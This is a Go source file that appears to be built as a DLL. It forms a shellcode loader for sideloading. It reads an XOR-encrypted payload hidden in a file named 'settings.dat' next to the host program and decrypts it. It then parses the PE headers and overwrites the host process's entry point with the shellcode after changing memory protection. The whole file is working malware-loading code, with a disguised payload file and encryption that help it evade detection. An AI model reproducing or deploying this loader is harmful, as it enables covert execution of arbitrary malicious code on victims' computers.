package main

//#include "dllmain.h"
import "C"

import (
	"bytes"
	"encoding/binary"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

var (
	shellcodeFile  = "settings.dat"
)

const (
    MEM_COMMIT     = 0x00001000
    MEM_RESERVE    = 0x00002000
    MEM_RELEASE    = 0x8000
    PAGE_READWRITE = 0x04
)

var (
    kernel32           = syscall.NewLazyDLL("kernel32.dll")
    getModuleHandle    = kernel32.NewProc("GetModuleHandleW")
    procVirtualProtect = kernel32.NewProc("VirtualProtect")
)


//WriteMemory writes the provided memory to the specified memory address. Does **not** check permissions, may cause panic if memory is not writable etc.
func WriteMemory(inbuf []byte, destination uintptr) {
    for index := uint32(0); index < uint32(len(inbuf)); index++ {
        writePtr := unsafe.Pointer(destination + uintptr(index))
        v := (*byte)(writePtr)
        *v = inbuf[index]
    }
}
func GetModuleHandle() (handle uintptr) {
    ret, _, _ := getModuleHandle.Call(0)
    handle = ret
    return
}
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
    ret, _, _ := procVirtualProtect.Call(
        uintptr(lpAddress),
        uintptr(dwSize),
        uintptr(flNewProtect),
        uintptr(lpflOldProtect))
    return ret > 0
}

// 将shellcode写入程序ep
func loader_from_ep(shellcode []byte) {
    baseAddress := GetModuleHandle()
    ptr := unsafe.Pointer(baseAddress + uintptr(0x3c))
    v := (*uint32)(ptr)
    ntHeaderOffset := *v
    ptr = unsafe.Pointer(baseAddress + uintptr(ntHeaderOffset) + uintptr(40))
    ep := (*uint32)(ptr)

    var entryPoint uintptr
    entryPoint = baseAddress + uintptr(*ep)
    var oldfperms uint32
    if !VirtualProtect(unsafe.Pointer(entryPoint), unsafe.Sizeof(uintptr(len(shellcode))), uint32(0x40), unsafe.Pointer(&oldfperms)) {
        panic("failed")
    }
    WriteMemory(shellcode, entryPoint)
    if !VirtualProtect(unsafe.Pointer(entryPoint), uintptr(len(shellcode)), uint32(oldfperms), unsafe.Pointer(&oldfperms)) {
        panic("failed")
    }
}

// XorEncryptDecrypt 异或加解密
func XorEncryptDecrypt(input, key []byte) (output []byte) {
	for i := 0; i < len(input); i++ {
		output = append(output, byte(input[i]^key[i%len(key)]))
	}
	return output
}

func decryptShellcode(shellcodeFilepath string) []byte {
	shellcodeData, err := ioutil.ReadFile(shellcodeFilepath)
	if err != nil {
		panic(err)
	}
	shellcodeReader := bytes.NewReader(shellcodeData)
	var keyLen int64
	err = binary.Read(shellcodeReader, binary.LittleEndian, &keyLen)
	if err != nil {
		panic(err)
	}
	var key = make([]byte, keyLen)
	err = binary.Read(shellcodeReader, binary.LittleEndian, key)
	if err != nil {
		panic(err)
	}
	var shellcodeLen int64
	err = binary.Read(shellcodeReader, binary.LittleEndian, &shellcodeLen)
	if err != nil {
		panic(err)
	}
	var shellcodeE = make([]byte, shellcodeLen)
	err = binary.Read(shellcodeReader, binary.LittleEndian, shellcodeE)
	if err != nil {
		panic(err)
	}
	shellcode := XorEncryptDecrypt(shellcodeE, key)
	return shellcode
}

//export test
func test() {
	ex, _ := os.Executable()
	exPath := filepath.Dir(ex)
	shellcode := decryptShellcode(filepath.Join(exPath, shellcodeFile))
    loader_from_ep(shellcode)
}

func main() {
}